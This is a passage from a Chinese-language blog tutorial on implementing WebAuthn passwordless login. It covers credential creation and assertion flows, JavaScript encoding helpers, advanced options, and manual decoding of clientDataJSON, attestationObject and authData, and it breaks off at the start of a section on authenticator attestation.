连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAssertionResponse {\r\n        authenticatorData: ArrayBuffer(37) {},\r\n        signature: ArrayBuffer(256) {},\r\n        userHandle: ArrayBuffer(64) {},\r\n        clientDataJSON: ArrayBuffer(118) {}\r\n    }\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\r\n    type: \"public-key\"\r\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\r\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\r\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\r\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\r\n    challenge, // 自行设置\r\n    rp, // 自行设置\r\n    user, // 自行设置\r\n    pubKeyCredParams: [\r\n        {\r\n            type: \"public-key\",\r\n            alg: -7 // ES256\r\n        },\r\n        {\r\n            type: \"public-key\",\r\n            alg: -257 // RS256\r\n        }\r\n    ],\r\n    authenticatorSelection: {\r\n        userVerification: \"discouraged\",\r\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\r\n    },\r\n    excludeCredentials, // 自行设置\r\n    timeout: 60000\r\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\r\n    return window.btoa(String.fromCharCode(...a));\r\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\r\n    const publicKeyCredential = {\r\n        id: credentialInfo.id,\r\n        type: credentialInfo.type,\r\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\r\n        response: {\r\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\r\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\r\n        }\r\n    };\r\n    return publicKeyCredential;\r\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\r\n    // 可以发送了\r\n}).catch((error) =&gt; {\r\n    console.warn(error); // 捕获错误\r\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        rp: {\r\n            icon\r\n        },\r\n        user: {\r\n            icon\r\n        },\r\n        attestation,\r\n        authenticatorSelection: {\r\n            requireResidentKey\r\n        },\r\n        extensions\r\n    }\r\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    uvm: true, // 要求认证器返回用户进行验证的方法\r\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\r\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\r\n    type: \"public-key\",\r\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\r\n    response: {\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\r\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\r\n    }\r\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\r\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\r\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\r\n    clientExtensions: {},\r\n    hashAlgorithm: \"SHA-256\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"none\",\r\n    attStmt: {},\r\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\r\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\r\n    let rpIdHash = buffer.slice(0, 32);\r\n    buffer = buffer.slice(32);\r\n  \r\n    let flagsBuf = buffer.slice(0, 1);\r\n    buffer = buffer.slice(1);\r\n\r\n    let flagsInt = flagsBuf[0];\r\n    let flags = {\r\n        up: !!(flagsInt &amp; 0x01),\r\n        uv: !!(flagsInt &amp; 0x04),\r\n        at: !!(flagsInt &amp; 0x40),\r\n        ed: !!(flagsInt &amp; 0x80),\r\n        flagsInt\r\n    }\r\n\r\n    let counterBuf = buffer.slice(0, 4);\r\n    buffer = buffer.slice(4);\r\n  \r\n    let counter = counterBuf.readUInt32BE(0);\r\n\r\n    let aaguid = undefined;\r\n    let credID = undefined;\r\n    let COSEPublicKey = undefined;\r\n\r\n    if(flags.at) {\r\n        aaguid = buffer.slice(0, 16);\r\n        buffer = buffer.slice(16);\r\n\r\n        let credIDLenBuf = buffer.slice(0, 2);\r\n        buffer = buffer.slice(2);\r\n\r\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\r\n        credID = buffer.slice(0, credIDLen);\r\n\r\n        buffer = buffer.slice(credIDLen);\r\n        COSEPublicKey = buffer;\r\n    }\r\n\r\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\r\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    kty: \"EC\",\r\n    alg: \"ECDSA_w_SHA256\",\r\n    crv: \"P-256\",\r\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\r\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\r\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"packed\",\r\n    attStmt: {\r\n        alg: -7,\r\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\r\n        x5c: [\r\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\r\n        ]\r\n    },\r\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\r\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\r\n    type: \"public-key\",\r\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\r\n    response: {\r\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\r\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\r\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\r\n    }\r\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.get\"\r\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 